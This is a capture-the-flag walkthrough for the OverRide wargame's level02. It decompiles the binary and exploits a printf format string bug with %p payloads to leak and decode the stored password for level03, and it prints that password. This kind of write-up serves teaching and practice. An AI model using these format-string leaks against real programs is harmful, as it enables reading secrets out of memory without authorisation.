# OverRide — Level02 Walkthrough

## Binary Analysis

The program:

- reads the next level's password from `/home/users/level03/.pass`,
- asks for a username and password,
- compares the input password with the stored password,
- if incorrect, prints the username using an **unprotected** `printf()`,
- if correct, spawns a shell.

Decompiled code:

```c
int main(int argc, char*argv[]) {
    int ac = argc;
    char **av = argv;

    int8_t username_buffer[0x64];
    int8_t pass_buffer[0x2a];
    int8_t pwd_buffer[0x64];
    size_t read_ret = 0;
    FILE *pwd_file = 0;

    memset(username_buffer, 0, 12);
    memset(pass_buffer, 0, 5);
    memset(pwd_buffer, 0, 12);

    pwd_file = fopen("/home/users/level03/.pass", 'r');
    if (pwd_file == 0) {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }

    read_ret = fread(pass_buffer, 1, 0x29, pwd_file);
    pass_buffer[strcspn(pass_buffer, "\n")] = 0;
    if (read_ret == 0x29) {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }

    fclose(pwd_file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");
    fgets(username_buffer, 0x64, stdin);
    username_buffer[strcspn(username_buffer, "\n")] = 0;
    printf("--[ Password: ");
    fgets(pwd_buffer, 0x64, stdin);
    pwd_buffer[strcspn(pwd_buffer, "\n")] = 0;
    puts("*****************************************");

    if (strncmp(pass_buffer, pwd_buffer, 0x29)) {
        printf(username_buffer);
        puts(" does not have access!");
        exit(1);
    }

    printf("Greetings, %s!\n", username_buffer);
    system("/bin/sh");

    return 0;
}
```

## Vulnerability: Format String

The critical vulnerability is at `printf(username_buffer)`. This is a **format string bug**: the username is not properly formatted as a string argument.

Since we don't know the correct password, we can't access the shell directly. However, we can exploit the format string vulnerability to read memory and extract the password that is loaded in the program.

## Exploitation

### Step 1: Find the Password on the Stack

The password is 40 bytes long. Each `%p` reads 8 bytes (on 64-bit systems). So we need at least 5 consecutive 8-byte values.

Testing with 30 `%p` values:

```bash
level02@OverRide:~$ (python -c 'print "%p" * 30'; python -c 'print "\n"';) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

We can see the password spans positions 22–26 (5 consecutive values).

### Step 2: Extract the Password

Use direct position specifiers to extract only those values:

```bash
level02@OverRide:~$ (python -c 'print "%22$p%23$p%24$p%25$p%26$p"'; python -c 'print "\n"';) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

### Step 3: Convert to ASCII

Each hex value is little-endian, so we reverse the bytes and decode:

```bash
level02@OverRide:~$ python -c 's="0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"; print "".join([part.decode("hex")[::-1] for part in s.split("0x") if part])'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Result

The extracted password is: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

This password can now be used to gain shell access as `level03`.